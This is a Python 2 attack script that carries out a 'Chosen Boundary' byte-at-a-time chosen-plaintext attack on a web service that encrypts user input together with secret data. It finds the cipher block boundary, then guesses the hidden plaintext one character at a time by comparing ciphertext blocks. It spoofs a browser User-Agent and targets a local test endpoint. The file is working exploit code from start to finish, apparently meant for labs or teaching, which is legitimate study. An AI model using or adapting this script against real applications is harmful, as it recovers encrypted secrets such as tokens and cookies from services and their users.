#!/usr/bin/python
'''
Implements the Chosen Boundary attack for a web application.
'''
import urllib2
import binascii
import sys

def updateRequest(url,ptParam,ptData,encDataLocation,headers={},data=None):
    if(encDataLocation == 'headers'):
        headers.update({ptParam:ptData})
    elif(encDataLocation == 'data'):
        data.update({ptParam:ptData})
    else:
        url = url+'&'+ptParam+'='+ptData
    
    headers.update({'User-Agent':'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'})
    req = urllib2.Request(url,data,headers)
    return req

def cbAttack(url,ptParam,encDataLocation,mode,headers={},data=None):
    firstChar = 48
    lastChar = 125
    charRange = range(firstChar,lastChar)
    #Remove the ; ccharacter
    charRange.remove(48+11)
    #just a backspace so we can get cool live printouts
    bs = '\b' * 1000 
    
    ptData = '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    req = updateRequest(url,ptParam,ptData,encDataLocation,headers,data)
    r = urllib2.urlopen(req)
    ct = r.read()

    '''Look for changes between 2 blocks so we know when we control all input in a given block E.G.
    aaaaa ->      xxxxxxyyyyyyzzzzzz
    aaaaaa ->     xxxxxxzzzzzzbbbbbb
    aaaaaaa ->    xxxxxxzzzzzznnnnnn
    
    Notice how the second block goes from changing on new input to being static. That means we must
    control all of the data in it. So we start with 1 char, add chars until the first changing block
    becomes static. Then add more chars until the second changing block becomes static. Now we know
    we control the second changing block. At this point we can add one more controlled block of 16
    characters if necessary since we know the boundary'''

    ptData = ptData+'~'
    req = updateRequest(url,ptParam,ptData,encDataLocation,headers,data)
    r = urllib2.urlopen(req)
    ct1 = r.read()

    #find where they first differ
    for firstDiff in range(0,len(ct1)+32,32):
        if(ct1[:firstDiff] != ct[:firstDiff]):
            break    
    #Update ct
    ct = ct1
    
    #Find where the first block becomes static (eg: the first difference in
    #two successive inputs moves to the next block)
    while(True):
        ptData = ptData+'~'
        req = updateRequest(url,ptParam,ptData,encDataLocation,headers,data)
        r = urllib2.urlopen(req)
        ct1 = r.read()
        #find the block where ct and ct1 first differ
        for firstDiff1 in range(0,len(ct1)+32,32):
            if(ct1[:firstDiff1] != ct[:firstDiff1]):
                #update ct
                ct=ct1
                break
        #if the location of the difference has changed, we found the input length we need      
        if(firstDiff1 != firstDiff):
            break

    firstDiff=firstDiff-32
    
    charFound=False
    
    #Put ct back so that it contains 1 char from the unknown string
    #-2 because we went one over when looking for the proper input length
    ptData = ptData[:len(ptData)-2]
    req = updateRequest(url,ptParam,ptData,encDataLocation,headers,data)
    r = urllib2.urlopen(req)
    ct = r.read()
    
    ptData = ptData+'~'
    for j in range(0,1000,1):
        charFound = False
        for i in charRange:
            ptData = replaceChar(ptData,len(ptData),chr(i))
            req = updateRequest(url,ptParam,ptData,encDataLocation,headers,data)
            r = urllib2.urlopen(req)
            ct1 = r.read()
            print bs,
            print ptData,
            if ct1[firstDiff:firstDiff+32] == ct[firstDiff:firstDiff+32]:
                #update ct
                req = updateRequest(url,ptParam,ptData[:len(ptData)-(j+2)],encDataLocation,headers,data)
                r = urllib2.urlopen(req)
                ct = r.read()
                ptData = ptData[1:len(ptData)]+'~' #the ~ is just a placeholder to be iterated on
                charFound=True
                break
            
        if(not charFound):
            print '\nDone. Expecting more? Try a larger initial input length.'
            break;
    
        
def replaceChar(str,index,newChar):
    return str[:index-1]+newChar+str[index:]

cbAttack('http://127.0.0.1:8000/encrypt?mode=CBC&pre=testtessadfadssdffffttesdfssstsadsadf&post=abcdefghijklmnopqrstuvwxyz12345','data','querystring','CBC')